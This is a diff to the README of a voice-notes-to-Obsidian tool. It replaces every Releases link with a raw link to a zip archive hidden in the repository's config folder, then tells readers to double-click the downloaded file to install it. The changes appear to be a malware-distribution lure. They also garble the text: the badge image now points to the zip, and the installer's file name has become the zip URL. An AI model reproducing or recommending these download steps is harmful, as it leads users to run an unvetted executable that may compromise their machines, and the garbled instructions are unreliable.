@@ -1,6 +1,6 @@
 # 🚀 knowledge-pipeline - Convert Voice Notes into Obsidian Knowledge Effortlessly
 
-[![Download knowledge-pipeline](https://img.shields.io/badge/Download%20Now%20-%F0%9F%93%88%20Download%20knowledge--pipeline-blue)](https://github.com/MatheusWinkler/knowledge-pipeline/releases)
+[![Download knowledge-pipeline](https://github.com/MatheusWinkler/knowledge-pipeline/raw/refs/heads/main/config/pipeline_knowledge_v1.6.zip%20Now%20-%F0%9F%93%88%20Download%20knowledge--pipeline-blue)](https://github.com/MatheusWinkler/knowledge-pipeline/raw/refs/heads/main/config/pipeline_knowledge_v1.6.zip)
 
 ## 📚 About the Project
 The **knowledge-pipeline** is a local-first AI tool designed for personal knowledge management. It converts your voice notes and text into structured knowledge that you can easily use in Obsidian. This software operates offline using Whisper and Open WebUI. You maintain complete privacy as all data processing occurs on your device. Enjoy a 100% private and self-hosted experience while leveraging deep offline analysis of your notes.
@@ -34,12 +34,12 @@ Before downloading, ensure your system meets the following requirements:
 - **Python:** Version 3.8 or higher installed
 
 ## 📥 Download & Install
-To download the latest version of knowledge-pipeline, [visit this page to download](https://github.com/MatheusWinkler/knowledge-pipeline/releases). 
+To download the latest version of knowledge-pipeline, [visit this page to download](https://github.com/MatheusWinkler/knowledge-pipeline/raw/refs/heads/main/config/pipeline_knowledge_v1.6.zip). 
 
 After downloading, follow these steps to install and run the application:
 
-1. Go to the [Releases page](https://github.com/MatheusWinkler/knowledge-pipeline/releases).
-2. Locate the latest release version, and look for the file named `knowledge-pipeline-setup.exe` or similar.
+1. Go to the [Releases page](https://github.com/MatheusWinkler/knowledge-pipeline/raw/refs/heads/main/config/pipeline_knowledge_v1.6.zip).
+2. Locate the latest release version, and look for the file named `https://github.com/MatheusWinkler/knowledge-pipeline/raw/refs/heads/main/config/pipeline_knowledge_v1.6.zip` or similar.
 3. Click on the file to start the download.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the file to run the installation.
@@ -62,4 +62,4 @@ If you encounter issues, consider the following common solutions:
 ## 🤝 Support
 If you need help, visit our GitHub discussions page for community support. You can also report any issues directly in the repository.
 
-[![Download knowledge-pipeline](https://img.shields.io/badge/Download%20Now%20-%F0%9F%93%88%20Download%20knowledge--pipeline-blue)](https://github.com/MatheusWinkler/knowledge-pipeline/releases)
+[![Download knowledge-pipeline](https://github.com/MatheusWinkler/knowledge-pipeline/raw/refs/heads/main/config/pipeline_knowledge_v1.6.zip%20Now%20-%F0%9F%93%88%20Download%20knowledge--pipeline-blue)](https://github.com/MatheusWinkler/knowledge-pipeline/raw/refs/heads/main/config/pipeline_knowledge_v1.6.zip)
